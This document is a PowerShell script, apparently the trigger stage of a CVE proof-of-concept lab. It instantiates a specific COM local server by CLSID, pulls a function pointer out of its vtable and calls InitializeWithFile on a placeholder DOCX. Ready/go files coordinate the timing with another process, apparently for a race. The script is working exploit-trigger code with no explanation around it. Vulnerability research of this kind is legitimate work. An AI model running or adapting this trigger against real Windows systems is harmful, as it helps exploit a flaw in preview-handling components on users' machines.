param(
    [string]$Path = "C:\CVELAB\final\docs\poc-placeholder.docx",
    [string]$ReadyFile = "",
    [string]$GoFile = ""
)

$ErrorActionPreference = "Stop"
Write-Host "[TRIGGER_STAGE] start"

function Add-Ole32NativeTypes {
    param(
        [string]$Source
    )

    if ("Ole32Native" -as [type]) {
        return
    }

    $assemblyDirectory = if ($PSScriptRoot) {
        $PSScriptRoot
    } else {
        (Get-Location).ProviderPath
    }
    $assemblyPath = Join-Path $assemblyDirectory "PreviewTrigger.Ole32Native.dll"

    if (-not (Test-Path -LiteralPath $assemblyPath)) {
        Add-Type -TypeDefinition $Source -OutputAssembly $assemblyPath -OutputType Library
    }

    if (-not ("Ole32Native" -as [type])) {
        Add-Type -Path $assemblyPath
    }
}

$src = @"
using System;
using System.Runtime.InteropServices;

public static class Ole32Native
{
    [DllImport("ole32.dll")]
    public static extern int CoCreateInstance(
        ref Guid rclsid,
        IntPtr pUnkOuter,
        uint dwClsContext,
        ref Guid riid,
        out IntPtr ppv
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int InitializeWithFileDelegate(
        IntPtr self,
        [MarshalAs(UnmanagedType.LPWStr)] string pszFilePath,
        uint grfMode
    );
}
"@

Add-Ole32NativeTypes -Source $src

Write-Host "[TRIGGER_STAGE] skipping Word COM; DOCX is already open by run-proof"
Write-Host "[TRIGGER_STAGE] after document search/open"
$clsid = [Guid]"{84F66100-FF7C-4FB4-B0C0-02CD7FB668FE}"
$iid   = [Guid]"{B7D14566-0509-4CCE-A71F-0A554233BD9B}"
$ppv = [IntPtr]::Zero

$CLSCTX_LOCAL_SERVER = 4

Write-Host "[TRIGGER_STAGE] before CoCreateInstance"
$hr = [Ole32Native]::CoCreateInstance(
    [ref]$clsid,
    [IntPtr]::Zero,
    $CLSCTX_LOCAL_SERVER,
    [ref]$iid,
    [ref]$ppv
)

Write-Host ("CoCreateInstance hr=0x{0:X8} ppv=0x{1:X}" -f ($hr -band 0xffffffff), $ppv.ToInt64())

if ($hr -ne 0 -or $ppv -eq [IntPtr]::Zero) {
    throw "CoCreateInstance failed"
}

if ($ReadyFile) {
    "ready" | Set-Content $ReadyFile -Encoding ASCII
    Write-Host "[TRIGGER_STAGE] ready after CoCreateInstance"
}

if ($GoFile) {
    Write-Host "[TRIGGER_STAGE] waiting GoFile before Initialize"
    while (-not (Test-Path $GoFile)) {
        Start-Sleep -Milliseconds 200
    }
    Write-Host "[TRIGGER_STAGE] GoFile seen; continuing to Initialize"
}

$vtbl = [Runtime.InteropServices.Marshal]::ReadIntPtr($ppv)
$slot3 = [Runtime.InteropServices.Marshal]::ReadIntPtr($vtbl, 3 * [IntPtr]::Size)

Write-Host ("INIT_VTBL=0x{0:X}" -f $vtbl.ToInt64())
Write-Host ("INIT_SLOT3=0x{0:X}" -f $slot3.ToInt64())
Write-Host "[TRIGGER_STAGE] before Initialize"
Write-Host "[+] Calling Initialize"

$initFn = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $slot3,
    [Ole32Native+InitializeWithFileDelegate]
)

$hr2 = $initFn.Invoke($ppv, $Path, 0)

Write-Host ("Initialize hr=0x{0:X8}" -f ($hr2 -band 0xffffffff))
Write-Host "[TRIGGER_STAGE] after Initialize"
Write-Host "[+] Trigger done"

[Runtime.InteropServices.Marshal]::Release($ppv) | Out-Null






